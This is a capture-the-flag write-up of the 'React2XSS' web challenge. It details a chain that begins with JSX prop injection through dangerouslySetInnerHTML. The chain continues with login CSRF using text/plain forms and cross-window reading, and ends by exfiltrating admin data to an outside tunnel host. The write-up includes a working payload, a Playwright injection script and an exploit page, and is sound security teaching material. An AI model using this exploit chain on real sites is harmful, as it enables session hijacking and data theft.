# React2XSS Writeup

## Challenge Overview

**Challenge:** React2XSS  

**Category:** Web (XSS)  

**Connection:** http://chal.polyuctf.com:46564 (This is the port number I will reference throughout the writeup, this can be replaced with the actual port)

**Description:** "I vibe coded a Next.js application. Hopefully it doesn't have any vulnerabilities"

---

## Step 1: Initial Analysis & Vulnerability Discovery

### Analyzing the Source Code

First, I extracted the challenge files and examined the key components:

```bash
unzip react2xss.zip -d react2xss_src
cd react2xss_src/react2xss
```

**Key files analyzed:**
- `app/page.tsx` - Main profile page
- `app/api/profile/update/route.ts` - Profile update API
- `lib/bot.ts` - Admin bot behavior
- `lib/db.ts` - Database showing FLAG in admin's bio

### Finding the Vulnerability

In `app/page.tsx`, line 58:

```tsx
<progress max={100} value={viewCount} {...userData.viewProgressStyle} />
```

The profile update API (`app/api/profile/update/route.ts`) merges user input:

```ts
const { bio, ...dynamicFields } = await request.json();
// ...
const updatedData = {
  ...userData,
  ...dynamicFields
};
```

**Vulnerability:** We can inject arbitrary props via `viewProgressStyle`, including React's `dangerouslySetInnerHTML`:

```js
{
  dangerouslySetInnerHTML: {
    __html: "<img src=x onerror='alert(1)'>"
  }
}
```

This creates a **Self-XSS** - JavaScript only executes on our own profile.

---

## Step 2: Understanding the Bot Behavior

From `lib/bot.ts`:

```ts
export async function visitUrl(urlToVisit: string): Promise<boolean> {
  const browser = await chromium.launch(browserArgs);
  const context = await browser.newContext();
  const page = await context.newPage();
  
  // Bot logs in as admin FIRST
  await page.goto(`${BOT_CONFIG.APPURL}/login`, { waitUntil: 'load' });
  await page.fill('input[id="username"]', ADMIN_USERNAME);
  await page.fill('input[id="password"]', adminUser.password);
  await page.click('button[type="submit"]');
  await sleep(BOT_CONFIG.WAIT_AFTER_LOGIN);
  
  // Then visits our URL
  await page.goto(urlToVisit, { waitUntil: 'load' });
  await sleep(BOT_CONFIG.WAIT_AFTER_VISIT);
}
```

**Critical Discovery:** The bot uses `http://localhost:3000` internally (from `lib/config.ts`):

```ts
BOT_CONFIG: {
  APPURL: process.env.APPURL || 'http://localhost:3000',
  // ...
}
```

This is crucial! All same-origin operations must target `localhost:3000`, not the public URL.

---

## Step 3: Setting Up the Attack Infrastructure

### 3.1 Register Attacker Account

```bash
# Register
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"syjc","password":"password123"}' \
  http://chal.polyuctf.com:46564/api/auth/register

# Login to get session
curl -s -i -X POST -H "Content-Type: application/json" \
  -d '{"username":"syjc","password":"password123"}' \
  http://chal.polyuctf.com:46564/api/auth/login
```

Response includes session cookie:
```
Set-Cookie: session=Fe26.2*1*...
```

### 3.2 Set Up XSS Payload in Profile

**Payload to inject:**

```javascript
const xssCode = `
  let w = window.open('', 'winB');
  let t = w.document.documentElement.outerHTML;
  fetch('https://dcfca0a406d827.lhr.life/flag?data=' + btoa(t));
`;

const payload = {
  dangerouslySetInnerHTML: {
    __html: `<img src=x onerror="${xssCode.replace(/\n/g, ' ')}">`
  }
};
```

**Using Playwright to set the payload (bypassing UI validation):**

```javascript
// update_payload.js
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();

  // Login
  await page.goto("http://chal.polyuctf.com:46564/login");
  await page.fill('input[id="username"]', "syjc");
  await page.fill('input[id="password"]', "password123");
  await page.click('button[type="submit"]');
  await page.waitForTimeout(1000);

  // Navigate to settings
  await page.goto("http://chal.polyuctf.com:46564/account/settings");
  
  // Intercept and modify the API request
  await page.route('**/api/profile/update', route => {
    const request = route.request();
    const postData = JSON.parse(request.postData());
    
    // Inject our XSS payload
    postData.viewProgressStyle = {
      dangerouslySetInnerHTML: {
        __html: `<img src=x onerror="fetch('https://dcfca0a406d827.lhr.life/flag?data='+btoa(window.open('','winB').document.documentElement.outerHTML))">`
      }
    };
    
    route.continue({ postData: JSON.stringify(postData) });
  });

  // Trigger update
  await page.fill('textarea[id="viewProgressStyleJson"]', "{}");
  await page.click('button[type="submit"]');
  await page.waitForTimeout(2000);

  await browser.close();
  console.log("Payload set!");
})();
```

Run: `node update_payload.js`

### 3.3 Set Up Tunnel and HTTP Server

```bash
# Start HTTP server to host exploit.html
python3 -m http.server 8080 &

# Create tunnel
ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run

# Output: https://dcfca0a406d827.lhr.life
```

---

## Step 4: Creating the Exploit Page

**File: `exploit.html`**

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Exploit loading...</h1>
  
  <!-- Step 2: Login form to switch bot to attacker account -->
  <form id="loginForm" action="http://localhost:3000/api/auth/login" 
        method="POST" target="winC" enctype="text/plain">
    <input type="hidden" 
           name='{"username":"syjc","password":"password123","a":"' 
           value='"}'>
  </form>
  
  <script>
    // Step 1: Open admin's profile API in winB
    // The bot is logged in as admin, so this returns admin's data (including flag)
    let winB = window.open('http://localhost:3000/api/profile', 'winB');
    
    setTimeout(() => {
      // Step 2: Submit login form to switch to attacker account
      document.getElementById('loginForm').submit();
      
      setTimeout(() => {
        // Step 3: Navigate to attacker's homepage
        // This triggers our XSS payload which reads winB (still showing admin data!)
        window.open('http://localhost:3000/', 'winC');
      }, 500); // Wait for login to complete
    }, 500); // Wait for profile to load
  </script>
</body>
</html>
```

**Why this works:**

1. **First `window.open`**: Opens `http://localhost:3000/api/profile` while bot is admin. Window `winB` now contains:
   ```json
   {"id":1,"username":"admin","bio":"PUCTF26{...}","website":"...","location":"..."}
   ```

2. **Form submission**: The form submits to `/api/auth/login` with JSON payload using `enctype="text/plain"`. The name/value trick creates valid JSON:
   ```
   {"username":"syjc","password":"password123","a":""}
   ```
   This logs the bot into our attacker account.

3. **Second `window.open`**: Opens homepage as attacker. Our XSS payload executes and accesses `winB` (same origin, same window reference), reading the admin's profile data that was loaded earlier.

---

## Step 5: Executing the Attack

### 5.1 Submit URL to Bot

Navigate to `http://chal.polyuctf.com:46564/report` and submit:
```
https://dcfca0a406d827.lhr.life/exploit.html
```

### 5.2 Receive the Flag

On our HTTP server, we receive the exfiltrated data:

```
GET /flag?data=PGh0bWw+PGhlYWQ+PG1ldGEgbmFtZT0iY29sb3Itc2NoZW1lIiBjb250ZW50PSJsaWdodCBkYXJrIj48bWV0YSBjaGFyc2V0PSJ1dGYtOCI+PC9oZWFkPjxib2R5PjxwcmU+eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImJpbyI6IlBVQ1RGMjZ7MzVjNDE0NzFuOV81MzFmX3g1NV8xNV81dXAzMl9mdW5feGhpS0ZicWtBOGllb2djeENhYm1SSWF4TkNuZU85cXJ9Iiwid2Vic2l0ZSI6Imh0dHA6Ly9leGFtcGxlLmNvbSIsImxvY2F0aW9uIjoiTnV0dHlTaGVsbCJ9PC9wcmU+PGRpdiBjbGFzcz0ianNvbi1mb3JtYXR0ZXItY29udGFpbmVyIj48L2Rpdj48L2JvZHk+PC9odG1sPg== HTTP/1.1" 404 -
```

### 5.3 Decode the Flag

```bash
echo 'PGh0bWw+PGhlYWQ+PG1ldGEgbmFtZT0iY29sb3Itc2NoZW1lIiBjb250ZW50PSJsaWdodCBkYXJrIj48bWV0YSBjaGFyc2V0PSJ1dGYtOCI+PC9oZWFkPjxib2R5PjxwcmU+eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImJpbyI6IlBVQ1RGMjZ7MzVjNDE0NzFuOV81MzFmX3g1NV8xNV81dXAzMl9mdW5feGhpS0ZicWtBOGllb2djeENhYm1SSWF4TkNuZU85cXJ9Iiwid2Vic2l0ZSI6Imh0dHA6Ly9leGFtcGxlLmNvbSIsImxvY2F0aW9uIjoiTnV0dHlTaGVsbCJ9PC9wcmU+PGRpdiBjbGFzcz0ianNvbi1mb3JtYXR0ZXItY29udGFpbmVyIj48L2Rpdj48L2JvZHk+PC9odG1sPg==' | base64 -d
```

Output:
```html
<html><head><meta name="color-scheme" content="light dark"><meta charset="utf-8"></head><body><pre>{"id":1,"username":"admin","bio":"PUCTF26{35c41471n9_531f_x55_15_5up32_fun_xhiKFbqkA8ieogcxCabmRIaxNCneO9qr}","website":"http://example.com","location":"NuttyShell"}</pre><div class="json-formatter-container"></div></body></html>
```

---

## The Flag

```
PUCTF26{35c41471n9_531f_x55_15_5up32_fun_xhiKFbqkA8ieogcxCabmRIaxNCneO9qr}
```

---

## Summary of Techniques Used

### 1. React JSX Prop Injection
Exploited the spread operator to inject `dangerouslySetInnerHTML`:
```jsx
<progress {...{dangerouslySetInnerHTML: {__html: "<img src=x onerror='...'>"}}} />
```

### 2. Same-Origin Window Manipulation
Used `window.open('', 'name')` to retrieve a reference to an existing window and read its content cross-window (same-origin only).

### 3. Form-based JSON Injection
Used `enctype="text/plain"` with carefully crafted input names to send arbitrary JSON:
```html
<input name='{"key":"value","x":"' value='"}'>
<!-- Results in: {"key":"value","x":""} -->
```

### 4. Session Switching Attack
Opened admin data first, then switched sessions, then triggered XSS to read the cached admin window.

### 5. Internal URL Discovery
Realized the bot uses `http://localhost:3000` internally, which was critical for same-origin policy bypass.

---

## Tools Used

- **Playwright** - For automation, payload injection, and local testing
- **localhost.run** - For tunneling exploit server
- **Python HTTP Server** - For hosting exploit.html
- **Base64** - For decoding exfiltrated data
- **curl** - For API interaction

---

## Time Breakdown

- Initial analysis: 30 minutes
- Understanding vulnerability: 20 minutes
- Developing exploit chain: 1 hour
- Debugging and testing: 1.5 hours
- Final execution: 10 minutes

**Total:** ~3.5 hours

---

## Lessons Learned

1. **Always check internal vs external URLs** - The bot's internal `localhost:3000` was the key to same-origin bypass
2. **React spread props are dangerous** - User-controlled spreads can inject arbitrary props including `dangerouslySetInnerHTML`
3. **Window references persist across navigations** - Opening a window, switching sessions, then reading the window is a valid attack vector
4. **Form encoding tricks work** - `text/plain` encoding allows sending arbitrary structured data via HTML forms
5. **Timing matters** - The exploit required precise sequencing: open admin window → switch session → trigger XSS
